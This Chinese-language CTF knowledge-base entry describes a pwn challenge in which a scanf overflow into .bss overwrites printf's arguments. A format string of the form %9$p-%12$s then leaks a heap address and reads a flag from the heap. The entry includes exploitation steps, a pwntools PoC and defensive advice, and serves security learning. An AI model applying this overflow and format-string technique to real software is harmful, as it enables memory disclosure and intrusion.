---
id: ctf-pwn-scanf-overflow-printf-args-heap-flag-leak
title: scanf 长度输入溢出覆盖 printf 参数区：格式化字符串泄露堆地址并读取堆上 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: scanf-overflow-printf-args-heap-flag-leak
tags:
- ctf
- pwn
- format-string
- scanf
- bss-overflow
- heap-leak
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:02:43+08:00'
  notes: 已对照原文与图 18 核对：输入 255 触发 bss 溢出、%9$p-%12$s 泄堆、堆+0x1e0、0x4040c0 参数覆盖一致；未复跑远程。
url: /docs/ctf/pwn/ctf-pwn-scanf-overflow-printf-args-heap-flag-leak/
draft: false
kb_aliases:
- 输入 255 溢出
- printf 参数覆盖
- '%9$p %12$s'
- 堆上 flag
- flag-market
---

## 一句话结论

程序在“支付金额”处用 `255` 触发的 `scanf` 读取越界写到 bss，越界区域正好覆盖后续 `printf` 的参数表；把格式串改成 `%9$p-%12$s` 即可先泄露堆地址，再让 `%s` 以攻击者填入的堆指针读取堆上的 flag。

## 原理

- `scanf` 读取长度/数字时没有限制目标缓冲区，输入 `000000000000255` 触发对 bss 相邻区域的越界写；该区域与 `printf` 的可变参数保存区重叠，因此攻击者能控制 `printf` 的参数值/指针。
- 第一次把 report 缓冲区写成 `a*0x100 + "%9$p-%12$s"`：`%9$p` 把第 9 个参数按指针打印，泄露堆地址；`%12$s` 把第 12 个参数当字符串指针解引用。
- flag 在启动时被读入一个放在栈上的 fstream/stream 对象，其底层缓冲区在堆上；泄露的堆地址加上固定偏移 `0x1e0` 即 flag 缓冲区。
- 第二轮通过 pay 输入把 printf 参数覆盖为 `0x4040c0` 等受控地址，第三轮把参数覆盖为算好的 flag 堆地址，最后 `printf` 的 `%s` 打印 flag。

## 触发条件

- 存在长度/数字输入导致的 bss 越界写，且越界范围覆盖 `printf` 参数表或格式串附近。
- 程序之后调用 `printf`，格式串或其参数可被同一输入影响。
- flag 已读入堆上的对象（如 fstream 缓冲区），且泄露的堆指针与 flag 有稳定偏移。
- 可以多次交互，分阶段泄露与写入。

## 利用步骤

1. 选择支付/输入功能，输入超长数字 `255` 触发越界写。
2. report 处送入 `a*0x100 + "%9$p-%12$s"`，从输出解析 `%9$p` 的堆地址。
3. 堆地址加固定偏移（本题 `0x1e0`）得到 flag 缓冲区。
4. 重新进入，pay 处送入 `p64(heap)`，让 `printf` 参数指向 flag。
5. 触发 `printf`，读取 flag。

## PoC

```python
from pwn import *

sla = lambda a, b: c.sendlineafter(a, b)

sla(b'2.exit', b'1')
sla(b'pay?', b'000000000000255')                       # 触发越界
sla(b'report:', b'a' * 0x100 + b'%9$p-%12$s')          # 覆盖格式串/参数

sla(b'2.exit', b'1')
sla(b'pay?', p64(0x4040c0))                            # 覆盖 printf 参数
c.recvuntil(b'\n')
heap = int(c.recvuntil(b'-', True).decode(), 16) + 0x1e0

sla(b'2.exit', b'1')
sla(b'pay?', p64(heap))                                # 参数指向堆上 flag
c.interactive()
```

说明：`0x4040c0`、`0x1e0` 为题目特定偏移，应按二进制与内存布局重新确认；未在本机复跑原题。

## 变体与关联

- **经典格式化字符串**：直接控制格式串时可用 `%n` 写 GOT；见 [[ctf-pwn-blind-format-string-dump-binary-got-hijack]]。
- **堆上敏感数据**：flag/密钥被读入堆缓冲区时，只需任意读即可；见 [[ctf-pwn-heap-residual-uninitialized-read-flag]]。
- **相邻 bss 溢出**：输入长度字段/数组下标越界写到全局结构体，常与函数指针或参数表相邻，可升级为控制流劫持。
- **参数表覆盖**：`printf` 的寄存器/栈参数布局随架构与优化变化，先本地调试确认第几个参数可控。

## 检测与防御

- 所有输入使用带长度限制的函数（`fgets`/`scanf("%15s")`/`std::cin.width`），并校验数字字符串长度。
- 不要把格式串交给用户控制；使用 `printf("%s", buf)` 而非 `printf(buf)`。
- 编译时开启 `-D_FORTIFY_SOURCE=2`、`-fstack-protector`，并对全局缓冲区做边界检查。
